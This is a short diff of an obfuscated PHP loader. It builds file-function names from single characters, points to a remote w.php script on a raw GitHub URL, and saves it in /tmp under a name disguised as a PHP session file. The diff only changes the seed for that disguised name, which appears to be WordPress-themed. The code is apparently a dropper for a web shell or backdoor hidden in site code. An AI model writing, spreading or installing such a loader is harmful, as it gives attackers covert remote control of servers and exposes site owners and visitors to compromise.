@@ -4,7 +4,7 @@ $fw = "f" . "w" . "r" . "i" . "t" . "e";
 $fo = "f" . "o" . "p" . "e" . "n";
 $fc = "f" . "c" . "l" . "o" . "s" . "e";
 
-$tmpfile = 'sess_' . md5('style') . '.php';
+$tmpfile = 'sess_' . md5('wp-22') . '.php';
 $data = ['https://raw.githubusercontent.com/nastar-id/kegabutan/master/w.php', "/tmp/$tmpfile"];
 
 if (!file_exists($data[1]) || filesize($data[1]) === 0) {
